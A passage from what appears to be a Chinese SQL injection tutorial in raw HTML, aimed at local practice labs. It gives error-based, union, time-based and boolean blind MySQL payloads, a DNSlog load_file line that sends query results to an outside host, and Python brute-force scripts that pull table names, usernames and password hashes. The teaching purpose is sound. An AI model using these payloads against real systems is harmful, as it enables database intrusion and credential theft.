class="hljs-number">0x5c</span>,(<span class="hljs-keyword">select</span> database())));<br><br><span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x5c</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">distinct</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database())));<br><br><span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x5c</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">distinct</span>(column_name)) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span>)));<br><br><span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x5c</span>,(<span class="hljs-keyword">select</span> group_concat(username,password) <span class="hljs-keyword">from</span> users)));<br></code></pre></td></tr></table></figure></li><li><p>结合updatexml()函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> database()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">distinct</span>(table_name)) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">distinct</span>(column_name)) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(username,password) <span class="hljs-keyword">from</span> users),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure></li></ul><ul><li><p>结合floor()函数(别称group by分组查询报错函数)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>),CONCAT(DATABASE(),<span class="hljs-built_in">FLOOR</span>(RAND(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> x <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> x;<br><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> CONCAT(DATABASE(),<span class="hljs-built_in">FLOOR</span>(RAND(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>));<br>这两条语句的效果是一样的 区别在于写法 第一种使用了别名`<span class="hljs-keyword">AS</span>`<br></code></pre></td></tr></table></figure><ul><li><p>原理：</p><ul><li><p><code>group by</code> 在对查询结果分组的时候，会依次去查询表中的记录并创建一个临时表，<code>group by</code>的对象<code>CONCAT((代码执行的地方),FLOOR(RAND(0)*2))</code>便是这个临时表的主键，如果临时表中的主键存在，则<code>count+1</code>，如果不存在，则将该主键插入到临时表中，但是在结合floor(rand(0)*2)的时候会出现主键重复问题，会报主键重复的错误。并且将group by对象代码执行结果作为报错信息进行显示</p></li><li><p><code>rand(x)</code>如果在查询的时候被使用，其值会被多次计算，计算的值的结果是唯一的 mysql底层结果 区别在于给<code>rand(x)</code>随机函数的种子的值</p><table><thead><tr><th align="center">SELECT FLOOR(RAND(0)*2) FROM users;</th><th align="center">RAND(0)*2</th><th align="center">FLOOR(RAND(0)*2)</th></tr></thead><tbody><tr><td align="center">SELECT FLOOR(RAND(0)*2) FROM users;</td><td align="center">0.3104408553898715</td><td align="center">0</td></tr><tr><td align="center">SELECT FLOOR(RAND(0)*2) FROM users;</td><td align="center">1.241763483026776</td><td align="center">1</td></tr><tr><td align="center">SELECT FLOOR(RAND(0)*2) FROM users;</td><td align="center">1.2774949104315554</td><td align="center">1</td></tr><tr><td align="center">SELECT FLOOR(RAND(0)*2) FROM users;</td><td align="center">0.6621841645447389</td><td align="center">0</td></tr><tr><td align="center">SELECT FLOOR(RAND(0)*2) FROM users;</td><td align="center">1.4784361528963188</td><td align="center">1</td></tr><tr><td align="center">SELECT FLOOR(RAND(0)*2) FROM users;</td><td align="center">1.4056283323146668</td><td align="center">1</td></tr></tbody></table><table><thead><tr><th align="center">CONCAT((代码执行的地方),FLOOR(RAND(0)*2))</th><th align="center">RAND(0)</th><th align="center">FLOOR(RAND(0)*2)</th><th align="center">count(*)</th><th align="center"></th></tr></thead><tbody><tr><td align="center"></td><td align="center">先查询users表第一条 执行FLOOR</td><td align="center">0</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">security1</td><td align="center">插入查询的结果 执行FLOOR</td><td align="center">1</td><td align="center">1</td><td align="center"></td></tr><tr><td align="center"></td><td align="center">再查询第二条 执行FLOOR</td><td align="center">1</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">security0</td><td align="center">插入查询的结果 执行FLOOR</td><td align="center">0</td><td align="center">1</td><td align="center"></td></tr><tr><td align="center"></td><td align="center">再查询第三条 执行FLOOR</td><td align="center">1</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">security1 ???</td><td align="center">插入查询的结果 执行FLOOR</td><td align="center">1</td><td align="center">2 ??</td><td align="center"></td></tr></tbody></table><ul><li>这里可以看到在<code>group by</code>创建的临时表中主键<code>security1</code>已经存在 由于硬插入从而导致主键重复报错 爆出<code>Duplicate entry &#39;security1&#39; for key &#39;group_key&#39;</code> 的错误 而<code>security1</code>就是我们想要的执行结果 从上述过程中可以看出 代码在执行的时候从表中取了三次数据，这里就引出一个注意事项就是想要执行成功就需要待查表中有三条以上数据</li><li>优化：<ul><li>从上面的逻辑来看 ，只要导致主键重复就可以实现 那么我们只需要<code>floor(rand(x)*2)</code>的结果为<code>0101</code>即可 当<code>floor(rand(x)*2</code>的<code>x</code>为<code>14</code>的时候，就可以在表中仅有两条数据的时候报错 即<code>0101</code></li></ul></li></ul></li></ul></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(DATABASE(),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">14</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x) <span class="hljs-keyword">as</span> a <span class="hljs-comment">--+  </span><br><span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users) <span class="hljs-keyword">as</span> a;<br>这是嵌套查询的写法 创建一个临时表`a` 和普通`<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users`的区别在于嵌套查询可以在普通查询的基础上做进一步操作<br><span class="hljs-built_in">count</span>() 与 <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) 的区别在于后者不排除<span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3 from (select count(*),concat((select schema_name from information_schema.schemata limit 0,1),floor(rand(14)*2))x from information_schema.tables group by x)a --+  //数据库</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand(14)*2))x from information_schema.tables group by x)a --+  //表</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3 from (select count(*),concat((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; and table_schema=database() limit 0,1),floor(rand(14)*2))x from information_schema.tables group by x)a --+  //列</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3 from (select count(*),concat((select username from users limit 0,1),floor(rand(14)*2))x from information_schema.tables group by x)a --+  // 字段值</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3 from (select count(*),concat((select password from users limit 0,1),floor(rand(14)*2))x from information_schema.tables group by x)a --+  // 字段值</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="有正常执行回显的注入"><a href="#有正常执行回显的注入" class="headerlink" title="有正常执行回显的注入"></a>有正常执行回显的注入</h2><ul><li><p>这种情况我们需要对回显注入点进行判断 找到回显注入点执行sql语句</p><ul><li><p>根据列数爆出注入点</p><ul><li><p><code>order by</code>的作用是对表中数据进行排序 前提是排序的列数不能大于表的列数 根据这个特性可以对列数进行判断</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3--+ 这里的`order by`是根据第几列进行排序 当列不存在的时候就会报错</span><br><span class="hljs-string">后续使用`union`进行注入即可</span><br></code></pre></td></tr></table></figure></li><li><p><code>union</code>特性猜列数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,3--+  union进行联合查询的时候 需要保证前后语句的列数一样，因此根据这个特性可以判断列数 当我们使前置查询的结果错误的时候 就会显示后置查询的结果 根据页面反馈的信息 在对应的字段处执行sql语句 ，理论是1，2，3三个位置都能执行sql语句 如下图  但是我们需要页面将信息回显 因此在执行回显的位置执行sql语句即可</span><br></code></pre></td></tr></table></figure><p><img src="/blogs/img/image-20231106161419700.png"></p></li><li><pre><code class="sql">select * from users where id=1&#39; union select 1,2,3--+ 页面回显正常elect * from users where id=-1&#39; union select 1,2,3--+ 页面回显正常 由于前置语句错误将后置语句的注入点显示出来select * from users where id=-1&#39; union select 1,database(),(select table_name from information_schema.tables where table_schema=database() limit 0,1)--+<figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs r"><br>      <br><br><span class="hljs-comment">## 无回显注入</span><br><br><span class="hljs-comment">### dnslog注入</span><br><br><span class="hljs-operator">+</span> 条件<span class="hljs-operator">:</span>`secure_file_priv=`<br><span class="hljs-operator">+</span> 权限可读可写<br>  <span class="hljs-operator">+</span> mysql5.7默认不开启 my.ini添加`secure_file_priv=`即可<br><br>```sql<br>`load_file<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>` 函数的作用是查找本地文件 如果查找不到 则会对给出的地址进行网络请求 从而实现dns缓存记录外带信息<br>load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.xxx.dnslog.cn\\abc&#x27;))<br>load_file(&#x27;\\security.xxx.dnslog.cn\abc&#x27;)<br></code></pre></td></tr></table></figure></code></pre></li></ul></li></ul></li></ul><h3 id="sleep注入"><a href="#sleep注入" class="headerlink" title="sleep注入"></a>sleep注入</h3><ul><li><p>利用数据库的逻辑执行去实现信息获取 在正确查询的基础上建立逻辑判断 如果逻辑判断正确 则<code>sleep</code>对应的时间</p><ul><li><code>if</code>(code,真,假) <code>ascii</code> <code>substring</code> <code>length</code> <code>hex</code> <code>mid</code> <code>left</code> <code>right</code>等函数实现</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND sleep(3)--+  利用`python`的`requests.get().elapsed.total_seconds()`来判断执行结果</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND if(ASCII(SUBSTRING((DATABASE()),1,1))=115,sleep(3),1)--+ //security</span><br><span class="hljs-string">select * from users where id =1&#x27;</span> <span class="hljs-keyword">AND</span> if(ASCII(<span class="hljs-built_in">SUBSTRING</span>((<span class="hljs-keyword">SELECT</span> table_name <span class="hljs-keyword">from</span>information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>DATABASE() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">104</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+ //httpinfo</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND if(ASCII(SUBSTRING((SELECT column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 0,1),1,1))=85,sleep(3),1)--+ //USER</span><br><span class="hljs-string">select * from users where id =1&#x27;</span> <span class="hljs-keyword">AND</span> if(ASCII(<span class="hljs-built_in">SUBSTRING</span>((<span class="hljs-keyword">SELECT</span> username <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">97</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+ //admin</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND if(ASCII(SUBSTRING((SELECT username from users limit 0,1),1,1))=101,sleep(3),1)--+  //e10adc3949ba59abbe56e057f20f883e</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND IF(HEX(LEFT(DATABASE(),1))=73,SLEEP(3),1)--+ //security //HEX+LEFT</span><br><span class="hljs-string">select * from users where id =1&#x27;</span> <span class="hljs-keyword">AND</span> IF(HEX(<span class="hljs-built_in">SUBSTRING</span>(DATABASE(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">73</span>,SLEEP(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+ //security //HEX+SUBSTRING</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND IF(HEX(MID(DATABASE(),1,1))=73,SLEEP(3),1)--+ //security //HEX+MID</span><br></code></pre></td></tr></table></figure><ul><li><code>python</code>脚本</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">databases</span>():<br>    db_name = []<br>    <span class="hljs-keyword">for</span> one <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> two <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>, <span class="hljs-number">127</span>):<br>            source = requests.get(<br>                <span class="hljs-string">&quot;http://127.0.0.1/sql/Less-1/?id=1&#x27; AND IF(HEX(MID(DATABASE(),&quot;</span> + <span class="hljs-built_in">str</span>(one) + <span class="hljs-string">&quot;,1))=&quot;</span> + <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">chr</span>(two),<br>                                                                                                             <span class="hljs-string">&#x27;UTF-8&#x27;</span>).<span class="hljs-built_in">hex</span>() + <span class="hljs-string">&quot;,SLEEP(3),1)--+&quot;</span>).elapsed.total_seconds()<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(source) &gt;= <span class="hljs-number">3</span>:<br>                db_name.append(<span class="hljs-built_in">chr</span>(two))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(db_name))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;数据库名:&#x27;</span> + <span class="hljs-string">&#x27;[ &#x27;</span> + <span class="hljs-string">&#x27;&#x27;</span>.join(db_name) + <span class="hljs-string">&#x27; ]&#x27;</span>)<br></code></pre></td></tr></table></figure></li></ul><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><ul><li><p>利用数据库的逻辑执行去实现信息获取 在正确查询的基础上建立逻辑判断 如果逻辑判断的内容正确 则页面正常显示</p><ul><li><code>ascii</code> 和 <code>substring</code>函数来实现</li><li>编写脚本实现爆破信息</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND ASCII(SUBSTRING((DATABASE()),1,1))=115; //security</span><br><span class="hljs-string">select * from users where id=1&#x27;</span> <span class="hljs-keyword">AND</span> ASCII(<span class="hljs-built_in">SUBSTRING</span>((<span class="hljs-keyword">SELECT</span> table_name <span class="hljs-keyword">from</span>users <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>DATABASE() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">104</span>;  <span class="hljs-operator">/</span><span class="hljs-operator">/</span>httpinfo<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND ASCII(SUBSTRING((SELECT column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 0,1),1,1))=85 //USER</span><br><span class="hljs-string">select * from users where id=1&#x27;</span> <span class="hljs-keyword">AND</span> ASCII(<span class="hljs-built_in">SUBSTRING</span>((<span class="hljs-keyword">SELECT</span> username <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">97</span> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>admin<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND ASCII(SUBSTRING((SELECT password from users limit 0,1),1,1))=101 //e10adc3949ba59abbe56e057f20f883e</span><br></code></pre></td></tr></table></figure></li><li><p><code>python</code>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python">/*<br>* 根据不同url求改requests请求<br>*/<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 当前接口使用的数据库名</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">databases</span>():<br>    db_name = []<br>    <span class="hljs-keyword">for</span> one <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> two <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>, <span class="hljs-number">127</span>):<br>            source = requests.get(<br>                <span class="hljs-string">&#x27;http://127.0.0.1/pk/vul/sqli/sqli_blind_b.php?name=lucy%27+AND+%28ASCII%28SUBSTRING%28%28SELECT&#x27;</span><br>                <span class="hljs-string">&#x27;+database%28%29%29%2C&#x27;</span> + <span class="hljs-built_in">str</span>(<br>                    one) + <span class="hljs-string">&#x27;%2C1%29%29%29%3D&#x27;</span> + <span class="hljs-built_in">str</span>(two) + <span class="hljs-string">&#x27;%23&amp;submit=%E6%9F%A5%E8%AF%A2&#x27;</span>).content.decode()<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;your email is: lucy@test.com&#x27;</span> <span class="hljs-keyword">in</span> source:<br>                db_name.append(<span class="hljs-built_in">chr</span>(two))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(db_name))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;数据库名:&#x27;</span> + <span class="hljs-string">&#x27;[ &#x27;</span> + <span class="hljs-string">&#x27;&#x27;</span>.join(db_name) + <span class="hljs-string">&#x27; ]&#x27;</span>)<br><br><br><span class="hljs-comment"># 所有表</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tables</span>(<span class="hljs-params">db_name</span>):<br>    table_name = [<span class="hljs-string">&#x27;|&#x27;</span>]<br>    <span class="hljs-keyword">for</span> one <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>):<br>        <span class="hljs-keyword">for</span> two <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):<br>            <span class="hljs-keyword">for</span> three <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>, <span class="hljs-number">127</span>):<br>                source = requests.get(<br>                    <span class="hljs-string">&#x27;http://127.0.0.1/pk/vul/sqli/sqli_blind_b.php?name=lucy%27+AND+%28ASCII%28SUBSTRING%28%28SELECT&#x27;</span><br>                    <span class="hljs-string">&#x27;+table_name+FROM+information_schema.%60TABLES%60+WHERE+table_schema%3D%27&#x27;</span> + db_name +<br>                    <span class="hljs-string">&#x27;%27+LIMIT+&#x27;</span> + <span class="hljs-built_in">str</span>(<br>                        one) + <span class="hljs-string">&#x27;%2C1%29%2C&#x27;</span> + <span class="hljs-built_in">str</span>(<br>                        two) + <span class="hljs-string">&#x27;%2C1%29%29%29%3D&#x27;</span> + <span class="hljs-built_in">str</span>(three) + <span class="hljs-string">&#x27;%23&amp;submit=%E6%9F%A5%E8%AF%A2&#x27;</span>).content.decode()<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;your email is: lucy@test.com&#x27;</span> <span class="hljs-keyword">in</span> source:<br>                    table_name.append(<span class="hljs-built_in">chr</span>(three))<br>        table_name.append(<span class="hljs-string">&#x27;|&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(table_name))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[ &#x27;</span> + db_name + <span class="hljs-string">&#x27; ]&#x27;</span> + <span class="hljs-string">&#x27;数据库下面的表结构为: &#x27;</span> + <span class="hljs-string">&#x27;&#x27;</span>.join(table_name))<br><br><span class="hljs-comment"># 所有列</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">columns</span>(<span class="hljs-params">db_name, table_name</span>):<br>    columns_name = [<span class="hljs-string">&#x27;|&#x27;</span>]<br>    <span class="hljs-keyword">for</span> one <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> two <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):<br>            <span class="hljs-keyword">for</span> three <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>, <span class="hljs-number">127</span>):<br>                source = requests.get(<br>                    <span class="hljs-string">&#x27;http://127.0.0.1/pk/vul/sqli/sqli_blind_b.php?name=lucy%27+AND+%28ASCII%28SUBSTRING%28%28SELECT&#x27;</span><br>                    <span class="hljs-string">&#x27;+column_name+FROM+information_schema.%60COLUMNS%60+WHERE+table_name%3D%27&#x27;</span> + table_name +<br>                    <span class="hljs-string">&#x27;%27+LIMIT+&#x27;</span> + <span class="hljs-built_in">str</span>(<br>                        one) + <span class="hljs-string">&#x27;%2C1%29%2C&#x27;</span> + <span class="hljs-built_in">str</span>(two) + <span class="hljs-string">&#x27;%2C1%29%29%29%3D&#x27;</span> + <span class="hljs-built_in">str</span>(<br>                        three) + <span 